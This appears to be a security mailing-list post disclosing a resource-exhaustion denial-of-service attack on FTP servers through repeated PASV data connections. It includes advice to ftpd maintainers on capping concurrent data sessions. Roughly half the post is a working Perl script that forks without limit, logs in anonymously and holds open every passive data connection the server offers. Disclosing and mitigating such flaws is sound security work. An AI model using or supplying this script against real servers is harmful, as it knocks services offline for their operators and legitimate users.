Who has more free file descriptors & network ports, you or the ftp server ?

ftpd's which limit connections to 1 per user@host or similar may have some
defense against this, or if they don't support multiple data connections
open at the same time.  I suspect "many" is the number of ftpd's which are
vulnderable to this attack so I've made no attempt (except in one case) to
contact vendors because there are just too many damn vendors, not to mention
ftpd's!  But basically, if the other end has, on average, maximum fd limit
at 63, allows 50 connections, that's 3000 open fd's.  I'm not sure how many
ftpd's are setup with that many open files as a part of the sytem, but not
many, I suspect.

No apologies for using perl(5), I just wanted a quick prototype.  It's not
perfect but then I did't want to spend too much time on this.

to ftpd maintainers:
I don't know of any ftp clients which make use of this feature (multiple
data channels supported concurrently) as the original ftp clients were all
line-based and only suported one transfer at a time.  Maybe this is
reasonable, but it would be a shame for the default defense to this attack
to mean you can't use FTP to it's full potential (i.e. start a transfer
from the current session but keep using the current `login' session, maybe
to start other transfers, as requried).  Triming the number of concurrent
data sessions to a maximum of 1-5 (by default) would probably be enough,
with the capability to set this higher/lower as required.

Darren


#!/usr/bin/perl

$DOS_HOST="localhost";

use IO::Socket;

$pid = $$;
$num = 0;

while (1) {
    while (fork) {
        $sock = IO::Socket::INET->new(
            Proto    => "tcp",
            PeerAddr => $DOS_HOST,
            PeerPort => "ftp(21)",
        );

        if (!$sock) {
            print "connect failed!\n";
            waitpid -1,0;
        }


        while (<$sock>) {
            print;
            print $sock "USER anonymous\r\n" if (/^220 .*/);
            print $sock "PASS root@\r\n" if (/^331 .*/);
            print $sock "PASV\r\n" if (/^230 .*/);

            if (/^227 .*/) {
                $remote = $_;
                $remote =~ s/^.* [^\d,]*(\d[\d,]+)[^\d,]*$/$1/;
                @bits = split(/,/, $remote);
                if ($#bits eq 5) {
                    $remport = $bits[4] * 256 + $bits[5];
                    $#bits = 3;
                    $remip = join('.', @bits);
                    $foo[$num++] = IO::Socket::INET->new(
                            Proto => "tcp",
                            PeerAddr => $remip,
                            PeerPort => "($remport)");
                }
                print $sock "PASV\r\n";
            }
            last if (/^530 .*/);
        }
        waitpid -1,0;
    }
    sleep(5);
}

